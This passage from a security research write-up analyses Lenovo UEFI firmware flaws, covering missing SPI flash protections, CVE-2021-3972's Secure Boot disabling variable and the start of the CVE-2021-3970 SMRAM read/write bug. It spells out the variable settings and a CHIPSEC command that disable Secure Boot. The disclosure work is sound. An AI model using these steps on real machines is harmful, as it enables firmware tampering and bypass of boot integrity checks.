<div id="attachment_161478" style="width: 955px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-6.-Hex-Rays-decompiled-code-from-PchBiosWriteProtect-responsible-for-initialization-of-BIOS-Control-Register-related-SPI-flash-protections.png"><img class="wp-image-161478 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-6.-Hex-Rays-decompiled-code-from-PchBiosWriteProtect-responsible-for-initialization-of-BIOS-Control-Register-related-SPI-flash-protections.png" alt="" width="945" height="282" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-6.-Hex-Rays-decompiled-code-from-PchBiosWriteProtect-responsible-for-initialization-of-BIOS-Control-Register-related-SPI-flash-protections.png 945w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-6.-Hex-Rays-decompiled-code-from-PchBiosWriteProtect-responsible-for-initialization-of-BIOS-Control-Register-related-SPI-flash-protections-300x90.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-6.-Hex-Rays-decompiled-code-from-PchBiosWriteProtect-responsible-for-initialization-of-BIOS-Control-Register-related-SPI-flash-protections-768x229.png 768w" sizes="(max-width: 945px) 100vw, 945px" /></a><p class="wp-caption-text"><em>Figure 6. Hex-Rays-decompiled code from</em> <span style="font-family: courier new, courier, monospace;">PchBiosWriteProtect</span><em> responsible for initialization of BIOS Control Register &#8211; related SPI flash protections</em></p></div>
<p>If it‚Äôs not set, it skips a few lines of code that are responsible for:</p>
<ul>
<li><strong>Performing MMIO read operation </strong>(line 15 in Figure 6) by reading a 32-bit value from the address 0xE00F8054. If we pass this address as an argument to the Python function pci_decode_from_addr, which we introduced in the Figure 3: that function will print the address, decoded as Bus: 0, Device: 0x1F, Function: 0, Offset: 0x54.<br />
Based on these values and knowing that the affected laptop (in our case Lenovo 110-15IBR) uses the N-series Intel System-on-a-Chip (SoC), we can find in its <a href="https://web.archive.org/web/20170507185355/http:/www.intel.com/content/dam/www/public/us/en/documents/datasheets/pentium-celeron-n-series-datasheet-vol-3-2015.pdf"><em>datasheet</em></a> (section 33.14.13, page 2258) that it‚Äôs accessing the SPI Base address (SBASE), 32-bit PCI configuration register containing the address of the SPI configuration space (we will call it SPIBAR), and saves it into the global variable.</li>
<li><strong>Registering the SW SMI handler function</strong> DispatchFunction (line 22 in Figure 6)<br />
This registered SW SMI handler DispatchFunction is invoked during platform initialization and if we look into the code of this function in Figure 7 below, we see that it‚Äôs responsible for setting bit 5 inside the register located at SPIBAR offset 0xFC. If we look into the <a href="https://web.archive.org/web/20170507185355/http:/www.intel.com/content/dam/www/public/us/en/documents/datasheets/pentium-celeron-n-series-datasheet-vol-3-2015.pdf"><em>documentation</em></a> (section 10.48 BCR), we can see that this corresponds to SMM_BWP (or EISS for our chipset) bit of the BIOS Control Register.</li>
</ul>
<div id="attachment_161479" style="width: 953px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-7.-Hex-Rays-decompiled-code-of-DispatchFunction-from-PchBiosWriteProtect.png"><img class="wp-image-161479 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-7.-Hex-Rays-decompiled-code-of-DispatchFunction-from-PchBiosWriteProtect.png" alt="" width="943" height="297" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-7.-Hex-Rays-decompiled-code-of-DispatchFunction-from-PchBiosWriteProtect.png 943w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-7.-Hex-Rays-decompiled-code-of-DispatchFunction-from-PchBiosWriteProtect-300x94.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-7.-Hex-Rays-decompiled-code-of-DispatchFunction-from-PchBiosWriteProtect-768x242.png 768w" sizes="(max-width: 943px) 100vw, 943px" /></a><p class="wp-caption-text"><em>Figure 7. Hex-Rays-decompiled code of </em><span style="font-family: courier new, courier, monospace;">DispatchFunction</span> <em>from</em> <span style="font-family: courier new, courier, monospace;">PchBiosWriteProtect</span></p></div>
<p>In the end, <span style="font-family: 'courier new', courier, monospace;">DispatchFunction</span> is also responsible for <strong>registering SMI handler function</strong> (<span style="font-family: 'courier new', courier, monospace;">ClearBIOSWE</span> in Figure 7) handling the SMI interrupt, which is triggered when someone tries to set the BIOSWE bit inside the BIOS Control Register from non-SMM code while the BIOS Control Register BLE bit is set. In that case, the installed handler will set BIOSWE (or WPD for our chipset) bit back to 0.</p>
<p><strong>As a result, skipping this code will result in misconfiguration of the BIOS Control Registers, exposing the system to the risk of SPI flash modification.</strong></p>
<h4><strong><em>BiosRegionLock analysis</em></strong></h4>
<p>The second driver, <span style="font-family: 'courier new', courier, monospace;">BiosRegionLock</span>, is responsible for setting up Protected Range registers PR0-PR4. Similar to the <span style="font-family: 'courier new', courier, monospace;">PchBiosWriteProtect</span> described above, it uses the <span style="font-family: 'courier new', courier, monospace;">BiosLock</span> bit inside <span style="font-family: 'courier new', courier, monospace;">DXE_PCH_PLATFORM_POLICY_PROTOCOL.LockDownConfig</span> (type <a href="https://github.com/tianocore/edk2-platforms/blob/60d6b7c751bbad5ccc15d276a170d6dd638bd88e/Silicon/Intel/Vlv2DeviceRefCodePkg/ValleyView2Soc/SouthCluster/Include/Protocol/PchPlatformPolicy.h#L453" target="_blank" rel="noopener"><em>PCH_LOCK_DOWN_CONFIG</em></a>) to decide whether or not to set SPI flash protections ‚Äì in this case Protected Range registers.</p>
<p>As shown in Figure 8, if it finds out that the <span style="font-family: 'courier new', courier, monospace;">BiosLock</span> bit is not set, it will simply skip code responsible for setting these registers and thus leave SPI flash unprotected.</p>
<div id="attachment_161480" style="width: 954px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-8.-Hex-Rays-decompiled-code-responsible-for-setting-the-Protected-Range-registers.png"><img class="wp-image-161480 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-8.-Hex-Rays-decompiled-code-responsible-for-setting-the-Protected-Range-registers.png" alt="" width="944" height="357" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-8.-Hex-Rays-decompiled-code-responsible-for-setting-the-Protected-Range-registers.png 944w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-8.-Hex-Rays-decompiled-code-responsible-for-setting-the-Protected-Range-registers-300x113.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-8.-Hex-Rays-decompiled-code-responsible-for-setting-the-Protected-Range-registers-768x290.png 768w" sizes="(max-width: 944px) 100vw, 944px" /></a><p class="wp-caption-text"><em>Figure 8. Hex-Rays-decompiled code responsible for setting the Protected Range registers</em></p></div>
<h3>CVE-2021-3972 ‚Äì ChgBootDxeHook driver ‚Äì disable UEFI Secure Boot</h3>
<p>The next vulnerability we will take a look at is the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3972" target="_blank" rel="noopener"><em>CVE-2021-3972</em></a>. This vulnerability allows an attacker with elevated privileges to change various UEFI firmware settings, including the UEFI Secure Boot state, or for example restoring the UEFI firmware factory settings, all by simply creating one UEFI variable.</p>
<p>Needless to say, such an action would have serious impact on system security. Disabling UEFI Secure Boot would mean that the firmware won‚Äôt enforce integrity verification of the UEFI drivers and applications during the boot process and will thus allow loading of any untrusted or malicious ones. On the other hand, restoring factory settings would not directly disable UEFI Secure Boot, but could expose a system to the risk of deploying some UEFI applications, such as bootloaders, with known vulnerabilities (e.g. see <a href="https://eclypsium.com/2020/07/29/theres-a-hole-in-the-boot/" target="_blank" rel="noopener"><em>BootHole</em></a>), thus allowing a bypass of UEFI Secure Boot.</p>
<p>In our analysis, we will work with the firmware image (version <strong>7XCN41WW</strong>) of the <strong>Lenovo 330-15IGM</strong>, which is affected by the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3972" target="_blank" rel="noopener"><em>CVE-2021-3972</em></a> vulnerability.</p>
<p>As an example, to disable UEFI Secure Boot on <strong>Lenovo 330-15IGM</strong>, the user need only create a UEFI variable with:</p>
<ul>
<li>Name: <span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisable <span style="font-family: georgia, palatino, serif;">or </span>ChgBootChangeLegacy</span></li>
<li>Namespace GUID: <span style="font-family: 'courier new', courier, monospace;">LENOVO_BACKDOOR_NAMESPACE_GUID</span></li>
<li>Attributes: NV + BS + RT (<span style="font-family: 'courier new', courier, monospace;">0x00000007</span>)</li>
<li>Value: Any non-null byte</li>
</ul>
<p>and restart the laptop.</p>
<p>To illustrate how easy it is, Windows users can create these variables from the privileged userland process (administrator with <a href="https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/privilege-constants" target="_blank" rel="noopener"><em>SE_SYSTEM_ENVIRONMENT_NAME</em></a> privilege) using the Windows API function <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setfirmwareenvironmentvariableexa" target="_blank" rel="noopener"><em>SetFirmwareEnvironmentVariable</em></a>.</p>
<p>This backdoor ‚Äúfeature‚Äù is implemented by the following two drivers in the firmware of affected devices:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootSmm (4CA0062A-66FE-4BE7-ACE6-FDE992C1C5EC)</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook (C9C3D147-9A92-4D00-B3AE-970E58B5C3AC)</span></li>
</ul>
<h4><strong><em>ChgBootSmm analysis</em></strong></h4>
<p><span style="font-family: 'courier new', courier, monospace;">ChgBootSmm</span> is an SMM module responsible for registration of the SW SMI handler function. As shown in Figure 9, it registers this SMI handler using the <span style="font-family: 'courier new', courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL.Register</span> function and sets the <span style="font-family: 'courier new', courier, monospace;">SwSmiInputValue</span> to <span style="font-family: 'courier new', courier, monospace;">0xCA</span>. This means that one can trigger execution of this function by writing the value <span style="font-family: 'courier new', courier, monospace;">0xCA</span> to I/O port <span style="font-family: 'courier new', courier, monospace;">0xB2</span>.</p>
<div id="attachment_161481" style="width: 951px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-9.-Hex-Rays-decompiled-code-‚Äì-ChgBootSmm-registers-SW-SMI-handler-number-0xCA.png"><img class="wp-image-161481 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-9.-Hex-Rays-decompiled-code-‚Äì-ChgBootSmm-registers-SW-SMI-handler-number-0xCA.png" alt="" width="941" height="64" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-9.-Hex-Rays-decompiled-code-‚Äì-ChgBootSmm-registers-SW-SMI-handler-number-0xCA.png 941w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-9.-Hex-Rays-decompiled-code-‚Äì-ChgBootSmm-registers-SW-SMI-handler-number-0xCA-300x20.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-9.-Hex-Rays-decompiled-code-‚Äì-ChgBootSmm-registers-SW-SMI-handler-number-0xCA-768x52.png 768w" sizes="(max-width: 941px) 100vw, 941px" /></a><p class="wp-caption-text"><em>Figure 9. Hex-Rays-decompiled code</em> ‚Äì <span style="font-family: courier new, courier, monospace;">ChgBootSmm</span> <em>registers SW SMI handler number</em> <span style="font-family: courier new, courier, monospace;">0xCA</span></p></div>
<p>By looking into this installed SMI handler in Figure 10, we can see that it uses <span style="font-family: 'courier new', courier, monospace;">EFI_SMM_VARIABLE_PROTOCOL</span> functions <span style="font-family: 'courier new', courier, monospace;">SmmGetVariable</span> and <span style="font-family: 'courier new', courier, monospace;">SmmSetVariable</span> to read from and write into various UEFI variables and the decision of what variable will be created or modified is made based on the value from <span style="font-family: 'courier new', courier, monospace;">RBX</span> register saved state.</p>
<div id="attachment_161482" style="width: 955px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver.png"><img class="wp-image-161482 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver.png" alt="" width="945" height="838" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver.png 945w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver-300x266.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver-768x681.png 768w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver-87x77.png 87w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver-60x53.png 60w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Hex-Rays-decompiled-code-of-SW-SMI-handler-installed-by-the-ChgBootSmm-driver-85x75.png 85w" sizes="(max-width: 945px) 100vw, 945px" /></a><p class="wp-caption-text"><em>Figure 10. Hex-Rays-decompiled code of SW SMI handler installed by the</em> <span style="font-family: courier new, courier, monospace;">ChgBootSmm</span><em> driver</em></p></div>
<p>Moreover, each written variable has the same attributes bitmask ‚Äì 0x00000007 (NV|BS|RT) ‚Äì meaning that all of the variables created will be stored in non-volatile storage and thus survive a power cycle.</p>
<p>The full list of the variables that can be accessed using this SW SMI handler are:</p>
<ul>
<li>Namespace: <span style="font-family: 'courier new', courier, monospace;">LENOVO_BACKDOOR_NAMESPACE_GUID</span>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisable</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootSetPxeToFirst</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootSetEfiPxeOneTime</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootRestoreFactory</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootFullRese</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootEnable</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootBootOrderSetDefault</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootChangeLegacy</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootLegacyLoadDefault</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootUefiLoadDefault</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">@Rm</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">OneTimeDisableFastBoot</span></li>
</ul>
</li>
<li>Namespace: <span style="font-family: 'courier new', courier, monospace;">A04A27F4-DF00-4D42-B552-39511302113D</span>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">BootType</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Setup</span></li>
</ul>
</li>
</ul>
<p>Notice the variables starting with the <span style="font-family: 'courier new', courier, monospace;">ChgBoot</span> string: these variables are used as ‚Äúcommands‚Äù for the <span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook</span> DXE driver, indicating whether to perform some action or not. In most cases their names are quite self-explanatory and from the security point of view, the following are the most interesting:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisable</span> and <span style="font-family: 'courier new', courier, monospace;">ChgBootChangeLegacy</span><br />
If created (any of them), <span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook</span> disables the UEFI Secure Boot feature during the next boot.</li>
<li><span style="font-family: 'courier new', courier, monospace;">ChgBootRestoreFactory</span><strong><br />
</strong>If created, <span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook</span> restores factory default values for UEFI Secure Boot variables <span style="font-family: 'courier new', courier, monospace;">PK</span>, <span style="font-family: 'courier new', courier, monospace;">KEK</span>, <span style="font-family: 'courier new', courier, monospace;">db</span>, and <span style="font-family: 'courier new', courier, monospace;">dbx</span> during the next boot. This might cause several problems, from corrupting the custom Secure Boot keys used by the victim and thus preventing booting the system, to loading the dbx, which might not contain the latest <a href="https://uefi.org/revocationlistfile" target="_blank" rel="noopener"><em>revocation information</em></a>. The latter could expose the system to the risk of deploying some UEFI applications, such as bootloaders, with known vulnerabilities (e.g. <a href="https://eclypsium.com/2020/07/29/theres-a-hole-in-the-boot/" target="_blank" rel="noopener"><em>BootHole</em></a>) and thus allowing an attacker to bypass UEFI Secure Boot verification too.</li>
</ul>
<p>All of the above-mentioned <span style="font-family: 'courier new', courier, monospace;">ChgBoot*</span> UEFI variables can be created even without the help of this SW SMI handler ‚Äì for example using Windows APIs ‚Äì because they are not protected against runtime access. This means that attackers can disable crucial security mechanisms from a user-mode process with administrator privileges.</p>
<p>But still, if there are some readers interested in how it can be done by invoking the SW SMI handler, here is the <a href="https://github.com/chipsec/chipsec"><em>CHIPSEC</em></a> command that can be used to create the <span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisable</span> variable:</p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">chipsec_util.py smi send 0 0xCA 0x53 0x53CA 0x1D 0 0xB2</span></p>
<h4><strong><em>ChgBootDxeHook analysis</em></strong></h4>
<p>So far, we know that attackers would need to create the appropriate <span style="font-family: 'courier new', courier, monospace;">ChgBoot*</span> UEFI variable to disable UEFI Secure Boot or restore factory UEFI Secure Boot keys during the boot. So how does it work under the hood? This functionality is handled by the <span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook</span> DXE Driver and all of the <span style="font-family: 'courier new', courier, monospace;">ChgBoot*</span> UEFI variables are being checked in its <span style="font-family: 'courier new', courier, monospace;">sub_3370</span> function shown in Figure 11.</p>
<div id="attachment_161483" style="width: 648px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-11.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-ChgBoot-variables..png"><img class="wp-image-161483 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-11.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-ChgBoot-variables..png" alt="" width="638" height="391" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-11.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-ChgBoot-variables..png 638w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-11.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-ChgBoot-variables.-300x184.png 300w" sizes="(max-width: 638px) 100vw, 638px" /></a><p class="wp-caption-text"><em>Figure 11. Hex-Rays-decompiled function from</em> <span style="font-family: courier new, courier, monospace;">ChgBootDxeHook¬†</span><em>checking</em> <span style="font-family: courier new, courier, monospace;">ChgBoot</span><em> variables.</em></p></div>
<p>To see how the UEFI Secure Boot is being disabled, we can look inside the <span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisableCheck</span> function (exactly the same also happens in the <span style="font-family: 'courier new', courier, monospace;">ChgBootChangeLegacyCheck</span> function, just with a different variable being checked).</p>
<p>As we can see in Figure 12, the function checks for the existence of the <span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisable</span> UEFI variable using runtime services <span style="font-family: 'courier new', courier, monospace;">GetVariable</span> function and in case it exists ‚Äî whatever its value ‚Äî executes a function we named <span style="font-family: 'courier new', courier, monospace;">DisableSecureBoot</span>.</p>
<div id="attachment_161484" style="width: 954px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-12.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-the-existence-of-ChgBootSecureBootDisable-NVRAM-variable.png"><img class="wp-image-161484 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-12.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-the-existence-of-ChgBootSecureBootDisable-NVRAM-variable.png" alt="" width="944" height="229" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-12.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-the-existence-of-ChgBootSecureBootDisable-NVRAM-variable.png 944w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-12.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-the-existence-of-ChgBootSecureBootDisable-NVRAM-variable-300x73.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-12.-Hex-Rays-decompiled-function-from-ChgBootDxeHook-checking-the-existence-of-ChgBootSecureBootDisable-NVRAM-variable-768x186.png 768w" sizes="(max-width: 944px) 100vw, 944px" /></a><p class="wp-caption-text"><em>Figure 12. Hex-Rays-decompiled function from</em> <span style="font-family: courier new, courier, monospace;">ChgBootDxeHook</span> <em>checking the existence of </em><span style="font-family: courier new, courier, monospace;">ChgBootSecureBootDisable</span> <em>NVRAM variable</em></p></div>
<p>Here is where the magic happens ‚Äì as you can see in Figure 13 , this function does two things:</p>
<ul>
<li>Sets byte value of the Setup UEFI variable at offset 0x4D9 to zero; this byte seems to be an indicator of the UEFI Secure Boot status inside the BIOS Setup utility.</li>
<li>Invokes protocol function (protocol GUID <span style="font-family: 'courier new', courier, monospace;">C706D63F-6CCE-48AD-A2B4-72A5EF9E220C</span> or <span style="font-family: 'courier new', courier, monospace;">LENOVO_SECURE_BOOT_SERVICES_PROTOCOL_GUID</span> in Figure 13) installed by the <span style="font-family: 'courier new', courier, monospace;">SecureBootService</span> DXE driver with a parameter identifying an operation to be performed, in this case the operation identified by the value <span style="font-family: 'courier new', courier, monospace;">0x02</span> ‚Äì which means the disabling of UEFI Secure Boot.</li>
</ul>
<div id="attachment_161485" style="width: 954px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-13.-Hex-Rays-decompiled-code-from-ChgBootDxeHook-responsible-for-disabling-UEFI-Secure-Boot.png"><img class="wp-image-161485 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-13.-Hex-Rays-decompiled-code-from-ChgBootDxeHook-responsible-for-disabling-UEFI-Secure-Boot.png" alt="" width="944" height="310" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-13.-Hex-Rays-decompiled-code-from-ChgBootDxeHook-responsible-for-disabling-UEFI-Secure-Boot.png 944w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-13.-Hex-Rays-decompiled-code-from-ChgBootDxeHook-responsible-for-disabling-UEFI-Secure-Boot-300x99.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-13.-Hex-Rays-decompiled-code-from-ChgBootDxeHook-responsible-for-disabling-UEFI-Secure-Boot-768x252.png 768w" sizes="(max-width: 944px) 100vw, 944px" /></a><p class="wp-caption-text"><em>Figure 13. Hex-Rays-decompiled code from </em><span style="font-family: courier new, courier, monospace;">ChgBootDxeHook</span><em> responsible for disabling UEFI Secure Boot</em></p></div>
<p>And how does this function from <span style="font-family: 'courier new', courier, monospace;">LENOVO_SECURE_BOOT_SERVICES_PROTOCOL</span> disable UEFI Secure Boot? It does so by invoking the SW SMI handler 0xEC registered by <span style="font-family: 'courier new', courier, monospace;">VariableRuntimeDxe</span> combined SMM/DXE driver, which in turn sets the authenticated UEFI variable named <span style="font-family: 'courier new', courier, monospace;">SecureBootEnforce</span> (namespace <span style="font-family: 'courier new', courier, monospace;">EFI_GENERIC_VARIABLE_GUID</span>) to <span style="font-family: 'courier new', courier, monospace;">0x00</span>.</p>
<p>However, on some affected models (for instance on the <strong>Lenovo V14-IIL</strong>), it‚Äôs not that simple and just creating a <span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisable</span> UEFI variable won‚Äôt disable UEFI Secure Boot. So, what‚Äôs the catch?</p>
<p>As we can see in Figure 14, after the <span style="font-family: 'courier new', courier, monospace;">ChgBootSecureBootDisable</span> variable check, another condition is present &#8211; it disables UEFI Secure Boot only if the value retrieved from the special <span style="font-family: 'courier new', courier, monospace;">LenovoVariable</span> persistent storage, accessed using a protocol identified by the GUID <span style="font-family: 'courier new', courier, monospace;">C20E5755-1169-4C56-A48A-9824AB430D00 (LENOVO_VARIABLE_PROTOCOL_GUID</span> in Figure 14), contains value <span style="font-family: 'courier new', courier, monospace;">Y</span> (<span style="font-family: 'courier new', courier, monospace;">0x59</span>).</p>
<div id="attachment_161486" style="width: 955px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-14.-Hex-Rays-decompiled-code-‚Äì-Disable-UEFI-Secure-Boot-with-additional-LenovoVariable-check.png"><img class="wp-image-161486 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-14.-Hex-Rays-decompiled-code-‚Äì-Disable-UEFI-Secure-Boot-with-additional-LenovoVariable-check.png" alt="" width="945" height="160" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-14.-Hex-Rays-decompiled-code-‚Äì-Disable-UEFI-Secure-Boot-with-additional-LenovoVariable-check.png 945w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-14.-Hex-Rays-decompiled-code-‚Äì-Disable-UEFI-Secure-Boot-with-additional-LenovoVariable-check-300x51.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-14.-Hex-Rays-decompiled-code-‚Äì-Disable-UEFI-Secure-Boot-with-additional-LenovoVariable-check-768x130.png 768w" sizes="(max-width: 945px) 100vw, 945px" /></a><p class="wp-caption-text"><em>Figure 14. Hex-Rays-decompiled code ‚Äì Disable UEFI Secure Boot with additional</em> <span style="font-family: courier new, courier, monospace;">LenovoVariable</span><em> check</em></p></div>
<p>For models including this check, higher privileges are required to disable secure boot from the OS, but it‚Äôs still possible by invoking the SW SMI handler registered by the <span style="font-family: 'courier new', courier, monospace;">LenovoVariableSmm</span> SMM module.</p>
<p>A description of this <span style="font-family: 'courier new', courier, monospace;">LenovoVariable</span> persistent storage is offered in the next section.</p>
<h3>CVE-2021-3970 ‚Äì Arbitrary SMM read/write</h3>
<p>In this last section, we are going to look at the analysis of the <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3970" target="_blank" rel="noopener"><em>CVE-2021-3970</em></a> vulnerability caused by an improper input validation in the SW SMI handler function, which can lead to the arbitrary read/write from/to the SMRAM and subsequent arbitrary code execution in SMM execution mode.</p>
<p>This vulnerability can be exploited from a privileged kernel-mode process by triggering the software SMI interrupt and passing a physical address of a specially crafted buffer as a parameter to the vulnerable SW SMI handler.</p>
<p>In this analysis, we will work with the firmware image (version <strong>7XCN41WW</strong>) of the <strong>Lenovo 330-15IGM</strong>, which is affected by the <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3970" target="_blank" rel="noopener"><em>CVE-2021-3970</em></a> vulnerability.</p>
<h4><strong><em>Lenovo variable storage and a vulnerable SW SMI handler</em></strong></h4>
<p>The firmware on certain Lenovo consumer laptop models implements a special <span style="font-family: 'courier new', courier, monospace;">LenovoVariable</span> persistent storage, allowing data storage of up to 4KB in SPI flash.</p>
<p>It‚Äôs used by the platform firmware to store various information, including the Lenovo product name, motherboard model name and version, OEM OS license, <strong>or as mentioned in the section above, in some cases it can be used to activate the </strong><span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook</span><strong> driver in order to disable UEFI Secure Boot feature</strong>.</p>
<p>In the firmware we analyzed, the SMM version of the Lenovo variable&#8217;s functionality is provided to other drivers by the protocol <span style="font-family: 'courier new', courier, monospace;">BFD02359-8DFE-459A-8B69-A73A6BAFADC0</span> (let‚Äôs name it <span style="font-family: 'courier new', courier, monospace;">LENOVO_VARIABLE_PROTOCOL_GUID</span>) and it is installed by the <span style="font-family: 'courier new', courier, monospace;">LenovoVariableSmm</span> SMM module.</p>
<p>This <span style="font-family: 'courier new', courier, monospace;">LENOVO_VARIABLE_PROTOCOL</span>‚Äôs interface provides four functions:</p>
<ol>
<li>Read ‚Äì Read data from a Lenovo variable</li>
<li>Write ‚Äì Write data into a Lenovo variable</li>
<li>Lock ‚Äì Lock a Lenovo variable for write</li>
<li>Unlock ‚Äì Unlock a Lenovo variable for write</li>
</ol>
<p>It is important to note that <span style="font-family: 'courier new', courier, monospace;">LenovoVariableSmm</span> not only installs this protocol to be accessible by other SMM modules, but it also registers the SW SMI handler function that allows accessing this storage from the OS by invoking SW SMI. <strong>The worst part is that it doesn‚Äôt properly validate parameters passed to the SW SMI handler, which can result in arbitrary read/write from/to the SMRAM.</strong></p>
<div id="attachment_161487" style="width: 955px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-15.-Hex-Rays-decompiled-code-of-SW-SMI-handler-function-registered-by-the-LenovoVariableSmm-module.png"><img class="wp-image-161487 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-15.-Hex-Rays-decompiled-code-of-SW-SMI-handler-function-registered-by-the-LenovoVariableSmm-module.png" alt="" width="945" height="807" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-15.-Hex-Rays-decompiled-code-of-SW-SMI-handler-function-registered-by-the-LenovoVariableSmm-module.png 945w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-15.-Hex-Rays-decompiled-code-of-SW-SMI-handler-function-registered-by-the-LenovoVariableSmm-module-300x256.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-15.-Hex-Rays-decompiled-code-of-SW-SMI-handler-function-registered-by-the-LenovoVariableSmm-module-768x656.png 768w" sizes="(max-width: 945px) 